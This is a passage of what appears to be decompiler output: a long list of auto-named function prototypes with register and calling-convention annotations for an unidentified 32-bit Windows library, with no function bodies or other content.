int __cdecl sub_1006F9C9(int a1, char *lpBuffer, int nNumberOfBytesToWrite, LONG lDistanceToMove, int a5);
int __cdecl sub_1006FA5A(int, LONG lDistanceToMove, int); // idb
int __cdecl sub_1006FAB7(int a1);
int __cdecl sub_1006FADE(DWORD FileSizeHigh, _QWORD *a2);
// BOOL __usercall sub_1006FB32@<eax>(int a1@<esi>);
// BOOL __usercall sub_1006FBB6@<eax>(int a1@<esi>);
int __cdecl sub_1006FBFA(int a1, int a2);
int __cdecl sub_1006FD5F(int a1, BOOL *a2);
int __cdecl sub_1006FDB1(int a1, int a2);
int __cdecl sub_1006FE3F(int a1, int a2, _DWORD *a3);
const WCHAR *__cdecl sub_1006FE75(LPCCH lpMultiByteStr);
// int __usercall sub_1006FEAE@<eax>(_BYTE *a1@<edi>);
int __cdecl sub_1006FFD0(int a1, int a2);
int __cdecl sub_10070081(int a1, const CHAR *a2, _DWORD *a3, int a4, _DWORD *a5);
int __cdecl sub_100701CC(int, LPCCH lpMultiByteStr); // idb
int __cdecl sub_10070281(int a1, LPCCH lpMultiByteStr, int a3, BOOL *a4);
int __cdecl sub_100702E8(int, LPCCH lpMultiByteStr, int, int); // idb
DWORD __cdecl sub_100703C0(int a1, LPCCH lpMultiByteStr);
int __cdecl sub_10070484(int a1, unsigned int Src, char *a3);
int __cdecl sub_10070530(int a1, int a2);
int __cdecl sub_10070558(int a1, double *a2);
int __cdecl sub_100705F1(int a1, int a2, int a3);
int __cdecl sub_10070605(char **a1);
int __cdecl sub_10070666(int a1, char a2);
// int __usercall sub_10070A34@<eax>(int a1@<esi>);
int __fastcall sub_10070AAB(unsigned __int8 *a1, int a2);
// _DWORD *__usercall sub_10070ADB@<eax>(int a1@<esi>, _BYTE *a2, int a3);
_QWORD *__cdecl sub_10070B4E(int a1);
void __cdecl sub_10070B7B(int a1);
_QWORD *__cdecl sub_10070B8D(int a1, int a2);
int __cdecl sub_10070BC2(int a1);
unsigned int __cdecl sub_10070BD3(int a1);
_DWORD *__cdecl sub_10070BE1(int a1);
// BOOL __usercall sub_10070BFA@<eax>(unsigned int a1@<eax>, unsigned int *a2@<ecx>);
int __cdecl sub_10070C77(_DWORD *a1, int a2);
// char __usercall sub_10070DAA@<al>(int a1@<eax>, int a2, char *a3);
void __cdecl sub_10070E6B(int a1);
// _DWORD *__usercall sub_10070E9E@<eax>(int a1@<eax>, int a2);
// void __usercall sub_10070EB6(int *a1@<esi>);
// _DWORD *__usercall sub_10070ED7@<eax>(int a1@<edx>, int a2);
// void __usercall sub_10070F16(int a1@<eax>);
// void __usercall sub_10070F3D(int a1@<esi>, int a2, unsigned int a3);
// void __usercall sub_10070FBC(int a1@<eax>, int *a2, _DWORD *a3, _DWORD *a4);
// void __usercall sub_1007105D(int *a1@<eax>);
void __cdecl sub_10071099(int *a1, _DWORD *a2);
// int __usercall sub_10071204@<eax>(int a1@<ebx>, int a2, _DWORD *a3, int (__cdecl *a4)(int, _DWORD, int, int, int *, const char **), int *a5);
// int __usercall sub_10071427@<eax>(int a1@<eax>, int *a2);
// int __usercall sub_100714CB@<eax>(int a1@<ebx>, int a2@<esi>);
// int __usercall sub_10071538@<eax>(int a1@<eax>, int a2@<ecx>, unsigned __int8 *a3, int *a4);
// int __usercall sub_100715D0@<eax>(int a1@<eax>, int a2@<ecx>, unsigned __int8 *a3);
// void __usercall sub_10071629(int a1@<edi>, int a2);
// int __usercall sub_1007168E@<eax>(int a1@<edi>, unsigned int *a2);
// int __usercall sub_10071706@<eax>(int a1@<eax>, int a2);
// _DWORD *__usercall sub_1007176E@<eax>(int a1@<eax>, int a2, _BYTE **a3, int a4);
// int __usercall sub_10071860@<eax>(int *a1@<eax>, int a2);
_DWORD *__thiscall sub_100718CF(_DWORD *Block, char a2);
// int __usercall sub_100718F6@<eax>(unsigned __int8 *a1@<ebx>, int a2@<edi>);
// int __usercall sub_1007196C@<eax>(unsigned __int8 *a1@<eax>, int *a2@<esi>);
int __cdecl sub_10071EAC(int *a1, int a2, unsigned int *a3);
int __cdecl sub_100721DE(int a1, char *a2, int (__cdecl *a3)(int, int, _DWORD *, _DWORD *), int a4, void **a5);
int __fastcall sub_10072489(int a1, int a2);
// int *__usercall sub_100724A3@<eax>(int a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_100724B9@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_100724EC@<eax>(int a1@<edi>, __int64 a2);
// int __usercall sub_10072561@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_100725BD@<eax>(int a1@<esi>);
_DWORD *__cdecl sub_10072648(int a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_10072686(int *a1, int a2);
int __cdecl sub_100726D9(int a1);
// int __usercall sub_10072726@<eax>(int a1@<eax>);
// int __usercall sub_10072766@<eax>(int a1@<eax>, char a2@<bl>, __int64 a3);
void __cdecl sub_100727CB(int a1, unsigned int a2);
// int __usercall sub_1007281E@<eax>(_BYTE *a1@<eax>, int a2@<ebx>);
// void __usercall sub_10072887(int *a1@<eax>, int a2@<ecx>, int *a3, int a4, char a5, unsigned int *a6, int a7, void **Src, int a9, int a10);
void __cdecl sub_10072B4C(int *a1, unsigned int a2, int a3);
// _DWORD *__usercall sub_10072D21@<eax>(int a1@<edi>, int a2, char a3);
// _DWORD *__usercall sub_10072D61@<eax>(unsigned int *a1@<eax>, int a2@<ecx>, int a3, int *a4, unsigned int a5, char a6);
// _DWORD *__usercall sub_10072DD5@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, void **Src, char a5);
// _DWORD *__usercall sub_10072E36@<eax>(int a1@<edi>, int a2, void **Src);
// void __usercall sub_10072E75(int a1@<ebx>, unsigned int a2@<edi>);
void __cdecl sub_10072EB2(int *a1, int a2, int a3);
// int __usercall sub_10072F93@<eax>(int *a1@<eax>, int a2@<ebx>);
void __fastcall sub_10073048(unsigned __int8 *a1, int a2);
// int __usercall sub_100730B2@<eax>(int *a1@<eax>, int a2);
// int __usercall sub_100730F2@<eax>(_BYTE *a1@<eax>, int a2@<ecx>, int a3, int *a4, _DWORD *a5);
// __int16 *__usercall sub_10073145@<eax>(int a1@<eax>, int *a2@<ebx>);
// int __usercall sub_100731A3@<eax>(int a1@<eax>, int a2@<edi>, int a3);
_DWORD *__cdecl sub_100732F4(int *a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_100734EB(int *a1, int a2, int a3, int a4);
_DWORD *__cdecl sub_10073539(int *a1, _DWORD *a2, int a3, int a4, int a5, int a6);
void __cdecl sub_100735BF(int *a1, int a2, int a3, int *a4, int a5, int a6, int a7, int a8, int a9);
// int __usercall sub_10073612@<eax>(int a1@<eax>, int a2, int *a3, int a4, unsigned __int8 a5, int a6, int a7);
int __cdecl sub_10073676(_DWORD *a1, char *a2);
int __cdecl sub_100736BF(_DWORD *a1, char *a2);
// int __usercall sub_10073720@<eax>(int a1@<esi>);
int sub_100739D6();
int sub_10073A22();
struct _RTL_CRITICAL_SECTION *__cdecl sub_10073A61(unsigned int a1);
DWORD __cdecl sub_10073AB3(LPCRITICAL_SECTION lpCriticalSection);
int sub_10073AD0();
void __cdecl sub_10073AD4(LPCRITICAL_SECTION lpCriticalSection);
int __cdecl sub_10073AE6(char *);
// int __usercall sub_10073B70@<eax>(_BYTE *a1@<eax>, int a2@<edi>);
// int __usercall sub_10073C0C@<eax>(int a1@<eax>, char *a2@<ecx>);
// void __usercall sub_10073D0C(int a1@<esi>);
// int __usercall sub_10073DFF@<eax>(int a1@<eax>, char *a2@<ecx>);
// unsigned __int64 __usercall sub_10073EB5@<edx:eax>(int a1@<eax>, int a2@<esi>);
// int __usercall sub_10073EE8@<eax>(char *a1@<ebx>, int a2@<edi>, int a3);
// int __usercall sub_10073F6B@<eax>(int a1@<esi>);
// int __usercall sub_10074061@<eax>(int result@<eax>);
// int __usercall sub_100740E4@<eax>(int a1@<eax>);
// __int64 __usercall sub_100740F4@<edx:eax>(const void *a1@<eax>);
// int __usercall sub_100741F2@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<edi>);
// int __usercall sub_1007475A@<eax>(_BYTE *a1@<eax>, int a2, int a3, int *a4);
__int16 __cdecl sub_10074800(int a1, __int64 a2);
int __cdecl sub_1007484A(int a1, int a2, int *a3);
int __cdecl sub_100748DC(int a1, int a2, int *a3);
int __cdecl sub_10074957(int a1, int a2, int *a3);
int __cdecl sub_100749CE(int a1, int a2, int *a3);
int __cdecl sub_10074E1D(int a1, int a2, int *a3);
void __cdecl sub_10074EB0(int a1, int a2, int *a3);
int __cdecl sub_10074FEB(int a1, int a2, int *a3);
// int __usercall sub_100750A8@<eax>(int a1@<eax>, unsigned int a2, int a3);
// int __usercall sub_100750E9@<eax>(_BYTE *a1@<eax>, int a2@<ecx>);
// unsigned __int16 *__usercall sub_10075137@<eax>(int *a1@<eax>, int a2, int a3);
// void __usercall sub_100751FD(int *a1@<eax>, int a2, int a3);
// int *__usercall sub_100754F5@<eax>(int *a1@<eax>, int a2, int a3);
unsigned __int16 *__cdecl sub_1007558D(int *a1, int a2);
void __cdecl sub_10075748(int *a1, int a2);
// char __usercall sub_100758D6@<al>(unsigned __int8 *a1@<eax>);
// int __usercall sub_10075930@<eax>(int a1@<eax>, int *a2@<edi>, int a3@<esi>);
// int *__usercall sub_1007596F@<eax>(unsigned __int8 *a1@<eax>, int *a2@<ecx>);
// char __usercall sub_10075A35@<al>(unsigned __int8 *a1@<eax>, char a2@<bl>);
// char __usercall sub_10075A58@<al>(int a1@<esi>);
// int *__usercall sub_10075A91@<eax>(int a1@<eax>, int a2@<esi>, int *a3);
// int __usercall sub_10075ACC@<eax>(unsigned __int8 *a1@<eax>, int a2@<edi>, unsigned __int8 *a3, char a4, int a5, int a6, int a7, char a8);
// int __usercall sub_10075B4A@<eax>(int *a1@<eax>, int a2);
// int *__usercall sub_10075B6F@<eax>(int *result@<eax>, _DWORD *a2@<edi>);
// int *__usercall sub_10075B99@<eax>(int *result@<eax>, int a2@<ecx>);
// int __usercall sub_10075C02@<eax>(int a1@<esi>);
// int __usercall sub_10075C58@<eax>(int a1@<eax>, int *a2);
// _DWORD *__usercall sub_10075C72@<eax>(const void **a1@<eax>, int a2, int a3, int a4);
_DWORD *__cdecl sub_10075D3B(int a1, int a2);
// void __usercall sub_10075D6A(unsigned int a1@<eax>, int a2@<ecx>, unsigned int a3@<edi>, int a4);
// _DWORD *__usercall sub_10075DC6@<eax>(const void **a1@<eax>, unsigned int a2@<edi>, int *a3@<esi>, int a4, unsigned int a5);
// _DWORD *__usercall sub_10075DEF@<eax>(_DWORD *result@<eax>, int a2, unsigned int a3);
// _DWORD *__usercall sub_10075E2C@<eax>(const void **a1@<eax>, int *a2@<ecx>, int *a3);
// __int16 __usercall sub_10075E6F@<ax>(int a1@<eax>, int a2@<ebx>);
void __cdecl sub_10075FD8(int a1, unsigned int a2);
// int __usercall sub_10076053@<eax>(_DWORD *a1@<eax>);
// unsigned int __usercall sub_10076074@<eax>(int a1@<esi>, char a2);
unsigned int __cdecl sub_100760B3(int a1, int a2);
_DWORD *__cdecl sub_100760FA(int a1, void **Src, int a3, void **a4);
_DWORD *__cdecl sub_1007631C(int a1, void **Src, int a3);
// unsigned int __usercall sub_10076339@<eax>(int *a1@<ebx>, int a2, int a3);
char *__cdecl sub_10076405(int a1, __int16 *a2, int a3);
// _DWORD *__usercall sub_1007653B@<eax>(_DWORD *a1@<ebx>, int a2);
_DWORD *__cdecl sub_100765C5(int a1, int a2, int a3);
// int *__usercall sub_100766CA@<eax>(int *a1@<eax>, int *a2@<ecx>, unsigned int a3@<ebx>);
// char *__usercall sub_1007674E@<eax>(char *result@<eax>, int a2@<ecx>, int *a3, int a4);
// _DWORD *__usercall sub_1007678C@<eax>(_DWORD *result@<eax>, int *a2@<ecx>, const char *a3);
// void __usercall sub_100767B1(int *a1@<edi>, int a2);
int __cdecl sub_10076809(int a1, unsigned __int8 *a2);
int __cdecl sub_10076842(int a1);
void __cdecl __spoils<edx,ecx> sub_10076851(int a1);
int __cdecl sub_1007687B(int a1, int *a2);
// int __usercall sub_10076904@<eax>(char *a1@<eax>, char a2@<dl>);
BOOL __cdecl sub_10076961(unsigned __int8 *a1);
// BOOL __usercall sub_1007699F@<eax>(int *a1@<eax>);
// int __usercall sub_100769EF@<eax>(int *a1@<eax>, int a2, int *a3);
// int __usercall sub_10076C71@<eax>(int *a1@<ebx>, int a2, int a3, int a4);
// int __usercall sub_10076F92@<eax>(int *a1@<eax>, int a2, int a3, int a4);
// _DWORD *__usercall sub_1007710F@<eax>(int *a1@<eax>, void *Src);
// _BYTE *__usercall sub_10077136@<eax>(_BYTE *result@<eax>, int *a2, int a3, int a4);
// _BYTE *__usercall sub_10077181@<eax>(int a1@<eax>, int *a2@<ebx>, int a3@<edi>, int a4);
// int __usercall sub_1007720E@<eax>(int result@<eax>, int a2@<ecx>);
// int *__usercall sub_10077230@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, int a3, int a4);
// int __usercall sub_100772A8@<eax>(int result@<eax>, int a2@<ecx>, int a3@<esi>);
// int __usercall sub_100772D1@<eax>(int result@<eax>);
// int __usercall sub_100772FA@<eax>(_DWORD *a1@<eax>, int a2, int a3, int a4, int a5);
// int __usercall sub_100773BA@<eax>(int result@<eax>);
// int __usercall sub_100773D8@<eax>(int result@<eax>, int a2@<ebx>, int a3@<edi>, int a4);
int __cdecl sub_10077418(int *a1, unsigned __int8 *a2, int a3);
// int __usercall sub_10077F0E@<eax>(int *a1@<edi>, int a2, int a3);
// int __usercall sub_10077F49@<eax>(int *a1@<edi>, int a2@<esi>, unsigned __int8 *a3);
int __cdecl sub_10077F78(int a1, unsigned __int8 *a2);
// int __usercall sub_10078052@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, int a4);
// int __usercall sub_100780FC@<eax>(int a1@<eax>, int *a2@<ebx>, int a3, int a4, int a5);
void __cdecl sub_100781A9(int *a1, unsigned __int8 *a2, int a3, int a4);
void __cdecl sub_100783F1(int *a1, unsigned __int8 *a2, int a3, int a4);
BOOL __cdecl sub_10078638(int a1, int a2);
int __cdecl sub_10078764(int a1, unsigned __int8 *a2);
int __cdecl sub_100789D6(int a1, int a2);
// int __usercall sub_10078A05@<eax>(int (__cdecl *a1)(_DWORD, int)@<eax>, int a2);
// int __usercall sub_10078A2C@<eax>(int *a1@<esi>, int (__cdecl *a2)(_DWORD, int));
// int __usercall sub_10078A55@<eax>(int a1@<eax>);
// int __usercall sub_10078A70@<eax>(int result@<eax>, int a2@<edx>);
// int __usercall sub_10078AA4@<eax>(_DWORD *a1@<ecx>, int a2@<esi>);
// int __usercall sub_10078AC8@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<edi>);
// BOOL __usercall sub_10078ADF@<eax>(_BYTE *a1@<eax>, int a2@<ecx>);
_DWORD *__cdecl sub_10078B27(int a1, int a2, int *Src);
void __cdecl sub_10078DDE(int a1, int a2, int *a3);
// void __usercall sub_10078ECE(int *a1@<eax>, int a2, char *Src, unsigned __int8 *a4, unsigned __int8 *a5, unsigned __int8 *a6);
// int __usercall sub_10078FDE@<eax>(int **a1@<eax>, int a2@<ecx>, int *a3@<esi>, int *a4, int *a5);
int __cdecl sub_1007900F(int a1, __int16 *a2);
int __cdecl sub_100790B2(int a1, int a2);
int __cdecl sub_1007910F(int a1, int a2);
// int __usercall sub_1007916A@<eax>(int *a1@<esi>, int a2);
// int __usercall sub_100791A3@<eax>(int a1@<eax>, int a2);
// void __usercall sub_100791F0(int a1@<esi>, int *a2, int a3, int a4, int a5);
// int __usercall sub_10079249@<eax>(int *a1@<eax>, _DWORD *a2@<esi>);
// void __usercall sub_100792A9(int a1@<esi>, int *a2);
// int __usercall sub_10079309@<eax>(int *a1@<eax>, int a2@<esi>, int a3, int a4);
// _DWORD *__usercall sub_10079388@<eax>(int *a1@<ecx>, int a2@<ebx>, int a3);
int __cdecl sub_100793F3(int *a1);
// int __usercall sub_1007950C@<eax>(int result@<eax>, int a2, int a3);
int __cdecl sub_1007952A(int *a1);
void __cdecl sub_1007967E(int a1, int a2, int *a3, int **a4, unsigned int *a5, int a6);
_DWORD *__cdecl sub_1007A25D(int *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, _DWORD *a10);
// int __usercall sub_1007A82F@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
// int __usercall sub_1007A92E@<eax>(int *a1@<eax>, int a2@<ebx>, int a3, int a4);
BOOL __fastcall sub_1007A9C0(unsigned __int8 *a1, unsigned __int8 *a2);
// int __usercall sub_1007A9DE@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_1007AA4D@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, int a4, int a5);
int __cdecl sub_1007AEDD(int a1, int a2);
// char *__usercall sub_1007AF57@<eax>(int *a1@<eax>, int *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
void __cdecl sub_1007B016(int a1, unsigned int a2);
int __cdecl sub_1007B034(int *a1, int a2, int a3, int a4);
// int __usercall sub_1007B125@<eax>(int a1@<eax>, unsigned __int8 *a2);
// int __usercall sub_1007B159@<eax>(int a1@<eax>, _DWORD *a2@<ebx>, int a3, unsigned __int8 *a4, int *a5);
// _DWORD *__usercall sub_1007B198@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>, int a4, int a5, int a6, int a7, unsigned int *a8);
int __cdecl sub_1007B202(int a1, int a2);
int __cdecl sub_1007B230(int *a1, int a2);
int __cdecl sub_1007B40F(_DWORD *a1, int *a2, int a3, int a4);
// int __usercall sub_1007B530@<eax>(int a1@<eax>, int a2@<edi>, int a3);
// int __usercall sub_1007B57F@<eax>(int a1@<edi>, int a2, int a3, unsigned __int16 *a4, int a5);
// int __usercall sub_1007B5D0@<eax>(int a1@<ecx>, int *a2@<edi>, int a3);
// int __usercall sub_1007B5F5@<eax>(unsigned __int8 *a1@<eax>, int *a2, int a3, int a4, int a5, int a6, int *a7, int a8, int a9, int a10);
_DWORD *__cdecl sub_1007B93D(int *a1, int *a2);
_DWORD *__cdecl sub_1007B9D6(int a1, int a2, int *a3, int a4, unsigned __int8 *a5);
char *__cdecl sub_1007BBFB(int *a1, unsigned __int8 *a2, _DWORD *a3, _DWORD *a4, char **a5);
// int __usercall sub_1007BDA0@<eax>(int result@<eax>, int *a2@<esi>, int a3);
int __cdecl sub_1007BDF4(int a1, __int16 *a2, int *a3);
// char *__usercall sub_1007BF54@<eax>(int a1@<eax>);
// int __usercall sub_1007BF77@<eax>(int *a1@<eax>, int *a2, int *a3, char ***a4);
// int *__usercall sub_1007C129@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, int *a3, int a4);
_DWORD *__cdecl sub_1007C1CE(int *a1, int a2);
// _DWORD *__usercall sub_1007C271@<eax>(int *a1@<edi>);
// _DWORD *__usercall sub_1007C285@<eax>(_DWORD *result@<eax>, int *a2@<ecx>, int a3);
int *__cdecl sub_1007C3B3(int *a1, _DWORD *a2, int a3);
// int __usercall sub_1007C3F7@<eax>(int **a1@<eax>, int *a2, int a3);
int __cdecl sub_1007C9C2(int *a1, int a2, int a3, char *a4, int a5, int a6, unsigned __int16 *a7, _BYTE *a8, int a9);
int __cdecl sub_1007CC64(int *a1, int **a2, char *a3);
_DWORD *__cdecl sub_1007D3E0(int a1, unsigned int a2, int a3, int a4);
// void __usercall sub_1007D4E2(int *a1@<esi>, int a2, int a3, int a4);
void __cdecl sub_1007D521(int a1, int a2, int a3, int a4);
// int __usercall sub_1007D656@<eax>(int a1@<eax>, int *a2, int a3, int a4, int a5);
// char __usercall sub_1007DAFF@<al>(int *a1@<eax>);
// int __usercall sub_1007DB62@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// int __usercall sub_1007DBAF@<eax>(_DWORD *a1@<eax>, int *a2);
int __cdecl sub_1007DC06(int a1, int a2);
int sub_1007E114();
int __cdecl sub_1007E117(int a1, int a2);
int __cdecl sub_1007E178(int *a1, int a2, int a3);
// int __usercall sub_1007E1FD@<eax>(_DWORD *a1@<ebx>, int *a2);
// int __usercall sub_1007E2BB@<eax>(int a1@<eax>, int a2@<edi>);
int __cdecl sub_1007E306(int *a1, int a2);
int __cdecl sub_1007E480(int a1, _DWORD **a2, unsigned __int8 *a3);
// void __usercall sub_1007F120(int a1@<eax>, _BYTE *a2@<ecx>, int *a3, int a4, _DWORD *a5);
// int __usercall sub_1007F22A@<eax>(int a1@<ebx>, int a2, unsigned __int8 *a3, unsigned __int8 *a4, unsigned __int8 *a5, int a6);
// _DWORD *__usercall sub_1007F6B7@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4);
int __cdecl sub_1007F728(int a1, unsigned __int8 *a2);
// int __usercall sub_1007F93A@<eax>(int *a1@<eax>, int a2@<ecx>);
// int __usercall sub_1007F97D@<eax>(int a1@<eax>, int *a2, int a3);
// int __usercall sub_1007F9F9@<eax>(int *a1@<edi>, int a2, int a3, int a4);
int __cdecl sub_1007FA16(int *a1, int **a2);
// int __usercall sub_1007FC16@<eax>(int *a1@<eax>, int *a2, int **a3, char *a4);
int __cdecl sub_1007FCA9(int **a1, int **a2, int *a3, char *a4);
int __cdecl sub_1007FD73(int, int); // weak
// BOOL __usercall sub_1008003C@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_100800E1@<eax>(int a1@<eax>, int a2, int a3);
// int *__usercall sub_1008010E@<eax>(int a1@<eax>, int *a2);
// int __usercall sub_10080158@<eax>(int a1@<eax>, int a2@<edx>, int a3);
void __cdecl sub_100801C4(int *a1, int a2, void **Src, int a4);
void __cdecl sub_1008027F(int a1, int a2, void **Src);
_DWORD *__cdecl sub_10080683(int *a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7);
// int __usercall sub_10080855@<eax>(int result@<eax>, _DWORD *a2@<ebx>, int a3, _DWORD *a4);
int __cdecl sub_100808B0(_DWORD *a1, _DWORD *a2, int a3, int a4, int a5);
// int __usercall sub_1008099D@<eax>(_DWORD *a1@<eax>, int a2, _DWORD *a3, int a4, _DWORD *a5);
int __cdecl sub_10080B22(int *a1, int a2, int a3, _DWORD *a4, int a5, _DWORD *a6, int a7, int a8);
// int __usercall sub_10080DEF@<eax>(int *a1@<eax>, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
int *__fastcall sub_10080FFF(int a1, int a2);
// void __usercall sub_10081017(unsigned int a1@<ebx>, int a2);
// _DWORD *__usercall sub_1008105F@<eax>(int a1@<eax>, __int16 *a2, int a3);
void __cdecl sub_10081142(int *a1, _DWORD *a2, int a3, int a4);
// int __usercall sub_100813BF@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>, int *a3);
int __cdecl sub_1008146C(_DWORD *a1, int a2, int a3);
unsigned int __cdecl sub_1008156D(int *a1, _DWORD *a2, _DWORD *a3, int a4);
// int *__usercall sub_100819B5@<eax>(int a1@<ecx>, int *a2@<edi>, _DWORD *a3, int a4, int a5);
void __cdecl sub_10081A02(int *a1);
int __cdecl sub_10081A84(int a1, char *a2, int a3, __int64 a4);
int __cdecl sub_10081B5B(size_t Size, char *a2, int a3);
int __cdecl sub_10081C0B(_DWORD *a1);
int __cdecl sub_10081C32(_DWORD *a1);
int __cdecl sub_10081C48(int a1, _DWORD *a2);
// void *__usercall sub_10081C60@<eax>(_DWORD *a1@<esi>);
int __cdecl sub_10081C74(int a1);
int __cdecl sub_10081C8D(int a1, unsigned int a2, int a3);
int __cdecl sub_10081E28(int *a1);
// int __usercall sub_100821E6@<eax>(int *a1@<esi>);
// int __usercall sub_1008229D@<eax>(int result@<eax>, unsigned int a2@<edi>, int a3);
// int __usercall sub_100822D7@<eax>(int *a1@<ebx>, int a2);
// int __usercall sub_10082349@<eax>(int a1@<ebx>, int *a2@<esi>, _DWORD *a3, int a4);
// unsigned int __usercall sub_10082374@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, unsigned int *a5);
// _DWORD *__usercall sub_100823A5@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, _DWORD *a5);
// void __usercall sub_100823D5(int *a1@<eax>, _BYTE *a2@<ecx>, int a3@<esi>, char a4);
// unsigned int __usercall sub_100823FB@<eax>(_DWORD *a1@<ebx>, int *a2@<esi>, int a3, unsigned int *a4, _DWORD *a5);
// void __usercall sub_10082428(int a1@<eax>, char a2@<dl>, unsigned int *a3@<ecx>);
// int __usercall sub_1008250D@<eax>(int *a1@<esi>);
// int __usercall sub_10082536@<eax>(_DWORD *a1@<eax>, unsigned __int8 a2@<cl>);
// int __usercall sub_100825AD@<eax>(int *a1@<eax>, __int16 a2, char a3, _DWORD *a4);
int __cdecl sub_10082606(int *a1, int a2);
// void __usercall sub_100840E0(int a1@<ebx>, int a2, int a3, unsigned int a4, int a5);
// void __usercall sub_10084195(int a1@<eax>, int *a2@<ebx>, int a3@<edi>, int a4);
void __cdecl sub_10084205(int *a1, int a2, int *a3, void **Src, int a5);
// void __usercall sub_10084CDF(int a1@<eax>, int *a2@<ecx>, int a3, int a4, void **Src, int a6, int a7);
int __cdecl sub_10084F0D(int (__cdecl **a1)(_DWORD, int), int a2);
// int __usercall sub_10084F84@<eax>(int *a1@<eax>, int a2);
// int __usercall sub_10084FB7@<eax>(int a1@<edi>, int a2@<esi>);
int __cdecl sub_10085024(int a1, int a2);
// _DWORD *__usercall sub_10085098@<eax>(_DWORD *result@<eax>, int a2@<ecx>, int a3);
void __cdecl sub_100850BD(int a1);
// int __usercall sub_10085130@<eax>(int a1@<edi>, unsigned int a2, char a3);
int __cdecl sub_100851CA(int a1, unsigned __int8 *a2, int a3);
// __int64 __usercall sub_1008520A@<edx:eax>(int *a1@<eax>, int a2);
int __cdecl sub_1008523B(int *a1, int a2);
__int64 __cdecl sub_100852B6(int a1, int *a2);
// int __usercall sub_10085308@<eax>(int a1@<eax>, int a2);
// BOOL __usercall sub_10085373@<eax>(int a1@<eax>);
// char __usercall sub_1008538E@<al>(char *a1@<esi>, int *a2);
// int __usercall sub_1008542B@<eax>(int a1@<eax>);
int __cdecl sub_10085449(int a1, int a2, int a3, __int64 a4, __int16 a5, _DWORD *a6);
// void __usercall sub_10085562(int a1@<edi>, int a2);
// BOOL __usercall sub_10085584@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, int a3, _DWORD *a4, BOOL *a5);
int __cdecl sub_100857F3(int a1, int *a2, int a3);
void __cdecl sub_10085C49(int a1, int a2, int a3);
// int __usercall sub_1008616A@<eax>(_DWORD *a1@<esi>, int *a2, int a3, int a4);
// BOOL __usercall sub_100861C1@<eax>(int *a1@<eax>, int a2@<edi>, int *a3, int *a4, int a5, int a6, _DWORD *a7);
double __cdecl sub_1008631F(double a1);
int __cdecl sub_10086360(int *a1, int *a2, int a3, __int64 a4, int a5, int a6);
// _DWORD *__usercall sub_10086539@<eax>(int a1@<eax>, int *a2, int a3, int *a4);
// int __usercall sub_1008668E@<eax>(int *a1@<eax>, int *a2@<ebx>, int a3);
_DWORD *__cdecl sub_10086731(int *a1, int *a2, int a3, __int64 a4, int *a5, _DWORD *a6, int *a7);
// int __usercall sub_100868CA@<eax>(int *a1@<esi>, int *a2, int a3, int a4, __int64 a5, int *a6);
// void __usercall sub_10086D7A(int a1@<eax>, int *a2@<edi>, int a3, __int64 a4, void *a5);
void __cdecl sub_10086DE3(int a1);
// int __usercall sub_10086E22@<eax>(int a1@<ecx>, unsigned __int16 *a2@<eax>, int a3, int a4);
// int __usercall sub_10086E8B@<eax>(int a1@<esi>, int *a2, char **a3, int a4);
// int __usercall sub_10086F8B@<eax>(_DWORD *a1@<edi>, int *a2, int a3, __int64 a4, int a5, _DWORD *a6);
__int64 __cdecl sub_1008710B(int a1, int a2, char a3, __int64 a4);
// void __usercall sub_10087D06(unsigned int a1@<esi>, int a2);
_DWORD *__cdecl sub_10087D63(int *a1, __int16 *a2, unsigned __int8 *a3, int **a4, __int16 a5);
// void __usercall sub_100883D6(unsigned int a1@<eax>);
// char __usercall sub_10088678@<al>(char *a1@<ebx>);
// int __usercall sub_100886D0@<eax>(unsigned __int8 *a1@<esi>);
// int __usercall sub_1008871D@<eax>(int *a1@<eax>);
// int __usercall sub_10088764@<eax>(unsigned __int8 *a1@<eax>, int *a2@<edi>);
// int __usercall sub_100887C7@<eax>(int *a1@<eax>, _BYTE *a2, ...);
// int __usercall sub_1008883F@<eax>(int *a1@<eax>, unsigned __int8 *a2, char *a3);
// char *__usercall sub_100888DA@<eax>(unsigned __int8 a1@<al>);
void __cdecl sub_10088909(int *a1, int a2, int a3, int a4, int a5);
// void __usercall sub_1008A057(_BYTE *a1@<esi>);
// unsigned __int8 *__usercall sub_1008A0A0@<eax>(int a1@<eax>, unsigned __int8 *a2@<ecx>);
void sub_1008A105();
// unsigned __int16 *__usercall sub_1008A145@<eax>(int a1@<eax>, unsigned __int16 *a2);
unsigned int sub_1008A35E();
void sub_1008A3D8();
void sub_1008A3F0();
// void __usercall sub_1008A416(unsigned int a1@<eax>);
// unsigned int __usercall sub_1008A467@<eax>(unsigned int a1@<ebx>);
// char *__usercall sub_1008A4DA@<eax>(char *result@<eax>, _WORD *a2@<ecx>, char *a3);
char *__thiscall sub_1008A576(unsigned __int16 *this);
unsigned __int16 *__cdecl sub_1008A64A(int a1, double a2);
// unsigned __int16 *__usercall sub_1008A743@<eax>(int a1@<eax>, int a2);
// int __usercall sub_1008A783@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_1008A7CB@<eax>(unsigned __int16 *a1@<eax>);
void __cdecl sub_1008A7DC(int a1);
int sub_1008AB6B();
void __cdecl sub_1008AC12(DWORD dwExceptionCode);
